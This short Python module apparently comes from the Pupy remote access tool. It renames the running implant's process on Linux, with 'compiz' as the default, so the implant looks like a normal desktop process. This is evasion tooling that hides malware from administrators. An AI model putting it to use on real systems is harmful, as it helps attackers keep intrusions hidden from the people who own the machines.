# -*- coding: utf-8 -*-

""" Change pupy process's name """

__dependencies__ = {
    'linux': ['hide_process']
}

__arguments__ = {
    'name': 'Process name'
}

__compatibility__ = ('linux')

import hide_process

def main(name='compiz'):
    hide_process.change_argv(argv=name)
